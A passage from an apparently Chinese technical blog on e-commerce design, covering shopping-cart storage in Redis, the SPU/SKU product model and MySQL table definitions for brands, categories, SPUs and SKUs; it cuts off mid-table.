class="keyword">float64</span>         <span class="string">`json:"special_price,omitempty"`</span> <span class="comment">// 指定价格加购物车</span></span><br><span class="line">PostFree     <span class="keyword">bool</span>            <span class="string">`json:"post_free,omitempty"`</span>     <span class="comment">// 是否免邮</span></span><br><span class="line">Activities   []*ItemActivity <span class="string">`json:"activities,omitempty"`</span>    <span class="comment">// 参加的活动记录</span></span><br><span class="line">AddTime      <span class="keyword">int64</span>           <span class="string">`json:"add_time"`</span></span><br><span class="line">UpdateTime   <span class="keyword">int64</span>           <span class="string">`json:"update_time"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 活动</span></span><br><span class="line"><span class="keyword">type</span> ItemActivity <span class="keyword">struct</span> &#123;</span><br><span class="line">ActID    <span class="keyword">string</span> <span class="string">`json:"act_id"`</span></span><br><span class="line">ActType  <span class="keyword">string</span> <span class="string">`json:"act_type"`</span></span><br><span class="line">ActTitle <span class="keyword">string</span> <span class="string">`json:"act_title"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点说一下 <code>Item</code> 这个结构，<code>item_id</code> 这个字段是标记购物车中某个商品的唯一标记，因为我们之前说过，同一个sku由于渠道不同，那么在购物车中会是两个不同的item；接下来的 <code>parent_item_id</code> 字段是用来标记父子关系的，这里将可能存在的树结构转成了顺序结构，我们不管是父商品还是子商品，都采用顺序存储，然后通过这个字段来进行关联；有些同学可能会奇怪，为什么会存order id这个字段呢？大家关注下自己的日常业务，比如：再来一单、定金预售等，这种一定是与某个订单相关联的，不管是为了资格验证还是数据统计。剩下的字段都是一些非常常规的字段，就不在一一介绍了；</p><blockquote><p>字段的类型，大家根据自己的需要进行修改。</p></blockquote><p>接下来该说怎么选择Redis的存储结构了，Redis常用的 <code>Hash Table、集合、有序集合、链表、字符串</code> 五种，我们一个个来分析。</p><p>首先购车一定有一个key来标记这个购物车属于哪个用户的，为了简化，我们的key假设是：<code>uid:cart_type</code>。</p><p>我们先来看如果用 <code>Hash Table</code>；我们添加时，需要用到如下命令：<code>HSET uid:cart_type sku ShoppingData</code>；看起来没问题，我们可以根据sku快速定位某个商品然后进行相关的修改等，但是注意，ShoppingData是一个json串，如果用户购物车中有非常多的商品，我们用 <code>HGETALL uid:cart_type</code> 获取到的时间复杂度是O(n)，然后代码中还需要一一反序列化，又是O(n)的复杂度。</p><p>如果用<code>集合</code>，也会遇到类似的问题，每个购物车看做一个集合，集合中的每个元素是 ShoppingData ，取到代码中依然需要逐一反序列化(反序列化是成本)，关于有序集合与链表就不在分析，大家可以按照上面的思路去尝试下问题所在。</p><p>看起来我们没得选，只有使用<code>String</code>，那我们来看一下<code>String</code>的契合度是什么样子。首先<code>SET uid:cart_type ShoppingDataArr</code>；我们把购物车所有的数据序列化成一个字符串存储，每次取出来的时间复杂度是O(1)，序列化、反序列化都只需要一次。看来是非常不错的选择。但是在使用中大家还是有几点需要注意。</p><ol><li>单个Value不能太大，要不然就会出现大key问题，所以一般购物车有上限限制，比如item不能超过多少个；</li><li>对redis的操作性能提升上来了，但是代码的就是修改单个item时的不便，必须每次读取全部然后找到对应的item进行修改；这里我们可以把从redis中的数据读取出来后，在内存中构建一个HashTable，来减少每次遍历的复杂度；</li></ol><p>网上也看到很多Redis数据结构组合使用来保存购物车数据的，但是无疑增加了网络开销，相比起来还是String最经济划算。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>至此对于购物车的实现设计算是完结了，其中关于订单表的设计会单独放到订单模块去讲。</p><p>对于整个购物车服务，虽然没有写的详细到某个具体的接口，但是分析到这一步，我相信大家心中都是有沟壑的，能够结合自己的业务去实现它。</p><p>文中有些很有意思的地方，建议大家动手去做做看，有任何问题，我们随时交流。</p><ul><li>改编版的责任链模式</li><li>Redis的分布式事务锁实现</li></ul><p>接下来终于要到订单部分的设计了，希望大家继续关注我们。</p><h2 id="商品系统"><a href="#商品系统" class="headerlink" title="商品系统"></a>商品系统</h2><h2 id="商品系统-Temporal万物"><a href="#商品系统-Temporal万物" class="headerlink" title="商品系统(Temporal万物)"></a>商品系统(Temporal万物)</h2><p>今天我们开始「商品系统」的篇章。本文分为如下五大模块：</p><ul><li>需求分析</li><li>架构设计</li><li>Spu和Sku的故事</li><li>数据模型设计</li><li>接口设计</li></ul><p>第一篇我们主要看看一个入门的电商平台(<strong>B2C</strong>)如何去构建自己的<strong>基础商品信息</strong>，其实这个事情很简单，想想我们的现实生活，商家<strong>摆放</strong>商品到货架，客户从货架<strong>挑选</strong>商品，客户把挑选好的商品<strong>放入</strong>购物车(篮)，最后客户去收银台<strong>结账</strong>。</p><h3 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h3><p>对于一个电商平台来讲，我们怎么理解上面的简单示例呢？接着，我们来拆分上面这个简单的事情：</p><blockquote><p>商家<strong>摆放</strong>商品到货架，客户从货架<strong>挑选</strong>商品，客户把挑选好的商品<strong>放入</strong>购物车(篮)，最后客户去收银台<strong>结账</strong></p></blockquote><ol><li>商家是谁：电商平台</li><li>摆放是什么意思：上架</li><li>货架在哪：前台系统(web/app/…)</li><li>挑选：浏览前台系统</li><li>放入：点击前台系统「加入购物车按钮」</li><li>…(暂不多说了)</li></ol><p><strong>备注</strong>：本篇文章主要来看看1、2、3、4步该如何去设计。</p><p>通过上面的分析我们可以得出下面的信息：</p><ol><li>我们需要一个「电商平台」，电商平台里面需要有个<strong>商品后台系统</strong>。</li><li>我们上架什么东西呢？商品！所以<strong>商品后台系统</strong>需要具备<strong>创建</strong>和<strong>发布</strong>商品到<strong>前台系统</strong>的功能。</li><li>我们需要一个<strong>前台系统</strong>(比如网页)，前台系统具备商品列表和商品详情的页面，可供用户<strong>浏览</strong>。</li><li>前台系统的数据怎么来？所以我们需要一个<strong>接口网关</strong>(对外统一提供服务能力，企业总线)和<strong>商品服务</strong></li></ol><p>整理之后得到如下的需求点：</p><table><thead><tr><th>需求点</th><th>功能点</th><th>项目命名</th><th>技术栈</th></tr></thead><tbody><tr><td>商品后台系统</td><td>1.创建商品 2.发布商品到前台系统</td><td>Temporal Backend</td><td>PHP</td></tr><tr><td>前台系统</td><td>1.商品列表 2.商品详情</td><td>Skr Frontend</td><td>Vue</td></tr><tr><td>接口网关</td><td>企业总线</td><td>Skr Gateway</td><td>kong</td></tr><tr><td>商品服务</td><td>1.创建商品接口 2.商品状态变更接口 2.商品列表接口 3. 商品详情接口</td><td>Temporal Service</td><td>Golang</td></tr></tbody></table><h3 id="架构设计-1"><a href="#架构设计-1" class="headerlink" title="架构设计"></a>架构设计</h3><p>通过上面的需求分析，再加上之前的《电商设计手册之用户体系》中的用户体系和《支付开发，不得不了解的国内、国际第三方支付流程》中的支付服务，我们规划出以下的架构图。</p><p><img src="/articles/电商设计手册/skr-product-service.jpg" alt></p><h3 id="Spu和Sku的故事"><a href="#Spu和Sku的故事" class="headerlink" title="Spu和Sku的故事"></a>Spu和Sku的故事</h3><p>对我们程序猿来讲「商品系统」刚开始的样子就是如下三点：</p><ol><li>创建商品功能：首先我们会有一张商品表，每创建一个商品我们会的到一个goods_id，如果商品存在父子的关系，加一个parent_id的字段就搞定了。</li><li>商品列表接口：商品表分页查询商品。</li><li>商品详情接口：商品表按goods_id索引查询商品信息。</li></ol><p>很简单是吧，基本一张表就搞定了，看起来也是没什么问题的。但是呢，程序设计的巧妙之处就在于<strong>抽象能力</strong>，电商行业把<code>goods_id</code>进行了进一步的抽象，产生了Spu和Sku概念，在了解Spu和Sku定义之前，我们还得了解下<strong>销售属性</strong>的含义，举个例子便于理解：</p><p>想想我们的现实生活，假如我们去批发市场上了一批AJ1球鞋，批发商会给我们不同<strong>配色</strong>、<strong>大小</strong>的AJ1球鞋。我们在店里销售这些商品时都会询问客户：“您是需要什么<strong>颜色</strong>和<strong>大小</strong>的AJ1球鞋呢？”。这里的<strong>颜色</strong>和<strong>大小</strong>就是所谓的<strong>销售属性</strong>，因为不同<strong>颜色</strong>和<strong>大小</strong>的AJ1球鞋可能价格不同、库存数量不同，现实生活中是不是如此，不同颜色或大小的AJ1都有差别巨大的价格。</p><p>接着，我们来看看Spu和Sku定义：</p><table><thead><tr><th>名称</th><th>概念</th><th>解释</th></tr></thead><tbody><tr><td>Spu</td><td>standard product unit 标准产品单位</td><td>goods_id剥离销售属性的部分，例如：小米8。商品列表我们展示Spu列表。</td></tr><tr><td>Sku</td><td>stock keeping unit 库存量单位</td><td>就是你想买的那个商品真正的编号，这个编号对应的库存就是你想买的那个商品的库存量。Spu+一或多个销售属性对应一个Sku，例如：小米8黑128G，其中黑和128G就是销售属性，小米8就是一个Spu。</td></tr></tbody></table><p>搞清楚了么？</p><h3 id="数据模型设计-1"><a href="#数据模型设计-1" class="headerlink" title="数据模型设计"></a>数据模型设计</h3><p>所以最后简单的<strong>商品表</strong>就拆成了<strong>spu表</strong>和<strong>sku表</strong>，接着我们还抽象出来了可复用的<strong>销售属性表</strong>和<strong>销售属性值表</strong>。除此之外<br>我们应该还有<strong>品牌表</strong>、<strong>类别表</strong>、简单的<strong>sku库存表</strong>(目前简单设计此表，后期具体业务重构此表)。接着我们列下这些表的明细：</p><table><thead><tr><th>表名称</th><th>表名</th></tr></thead><tbody><tr><td>品牌表</td><td>product_brands</td></tr><tr><td>类别表</td><td>product_category</td></tr><tr><td>spu表</td><td>product_spu</td></tr><tr><td>sku表</td><td>product_sku</td></tr><tr><td>销售属性表</td><td>product_attr</td></tr><tr><td>销售属性值</td><td>product_attr_value</td></tr><tr><td>sku库存表</td><td>product_sku_stock</td></tr></tbody></table><p>除了上面的表之外，我又加了另一张表 <code>关联关系冗余表 product_spu_sku_attr_map</code>，为什么呢？顾名思义，冗余用的，有了这张表，我们可以很高效的得到：</p><ol><li>spu下 有哪些sku</li><li>spu下 有那些销售属性</li><li>spu下 每个销售属性对应的销售属性值(一对多)</li><li>spu下 每个销售属性值对应的sku(一对多)</li></ol><p>具体表结构如下所示：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 品牌表 product_brands</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_brands`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'品牌ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'品牌名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'品牌描述'</span>,</span><br><span class="line">    <span class="string">`logo_url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'品牌logo图片'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'品牌表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 类别表 product_category</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_category`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'分类ID'</span>,</span><br><span class="line">    <span class="string">`pid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'父ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类描述'</span>,</span><br><span class="line">    <span class="string">`pic_url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类图片'</span>,</span><br><span class="line">    <span class="string">`path`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'分类地址&#123;pid&#125;-&#123;child_id&#125;-...'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'类别表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- spu表 product_spu</span></span><br><span class="line"><span class="comment">-- spu: standard product unit 标准产品单位</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_spu`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'SPU ID'</span>,</span><br><span class="line">    <span class="string">`brand_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'品牌ID'</span>,</span><br><span class="line">    <span class="string">`category_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'分类ID'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'spu名称'</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'spu描述'</span>,</span><br><span class="line">    <span class="string">`selling_point`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'卖点'</span>,</span><br><span class="line">    <span class="string">`unit`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'spu单位'</span>,</span><br><span class="line">    <span class="string">`banner_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'banner图片 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`main_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'商品介绍主图 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'售价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'售价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`market_price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`market_price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> AUTO_INCREMENT=<span class="number">666666</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'spu表'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- sku表 product_sku</span></span><br><span class="line"><span class="comment">-- sku: stock keeping unit 库存量单位</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`product_sku`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'SKU ID'</span>,</span><br><span class="line">    <span class="string">`spu_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'SPU ID'</span>,</span><br><span class="line">    <span class="string">`attrs`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'销售属性值&#123;attr_value_id&#125;-&#123;attr_value_id&#125; 多个销售属性值逗号分隔'</span>,</span><br><span class="line">    <span class="string">`banner_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'banner图片 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`main_url`</span> <span class="built_in">text</span> <span class="keyword">COMMENT</span> <span class="string">'商品介绍主图 多个图片逗号分隔'</span>,</span><br><span class="line">    <span class="string">`price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'售价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'售价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`market_price_fee`</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，整数方式保存'</span>,</span><br><span class="line">    <span class="string">`market_price_scale`</span> <span class="built_in">tinyint</span> <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'市场价，金额对应的小数位数'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span 